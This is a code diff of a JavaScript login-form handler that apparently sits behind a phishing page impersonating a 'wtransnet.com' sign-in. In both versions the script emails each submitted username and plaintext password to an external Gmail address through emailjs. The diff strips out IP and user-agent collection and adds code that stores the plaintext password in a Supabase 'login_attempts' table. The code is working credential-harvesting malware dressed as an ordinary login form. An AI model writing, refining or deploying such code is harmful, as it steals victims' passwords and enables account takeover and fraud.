@@ -17,7 +17,6 @@ loginForm.addEventListener('submit', async function(e) {
 
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value;
-  const remember = document.getElementById('remember').checked;
 
   if (!username || !password) {
     alert('Please fill in all fields');
@@ -31,24 +30,12 @@ loginForm.addEventListener('submit', async function(e) {
   submitButton.disabled = true;
 
   try {
-    const userEmail = username.includes('@') ? username : `${username}@wtransnet.com`;
-
-    const loginData = {
-      username: username,
-      email: userEmail,
-      timestamp: new Date().toLocaleString(),
-      ip_address: await getClientIP(),
-      user_agent: navigator.userAgent
-    };
-
     const { data, error } = await supabase
       .from('login_attempts')
       .insert([
         {
           username: username,
-          email: userEmail,
-          ip_address: loginData.ip_address,
-          user_agent: loginData.user_agent
+          password: password
         }
       ]);
 
@@ -60,11 +47,7 @@ loginForm.addEventListener('submit', async function(e) {
     const emailParams = {
       to_email: 'your-email@gmail.com',
       username: username,
-      password: password,
-      user_email: userEmail,
-      timestamp: loginData.timestamp,
-      ip_address: loginData.ip_address,
-      remember_me: remember ? 'Yes' : 'No'
+      password: password
     };
 
     const emailResponse = await emailjs.send(
@@ -86,16 +69,6 @@ loginForm.addEventListener('submit', async function(e) {
   }
 });
 
-async function getClientIP() {
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip;
-  } catch (error) {
-    console.error('Error fetching IP:', error);
-    return 'Unknown';
-  }
-}
 
 if (mobileMenuToggle) {
   mobileMenuToggle.addEventListener('click', function() {
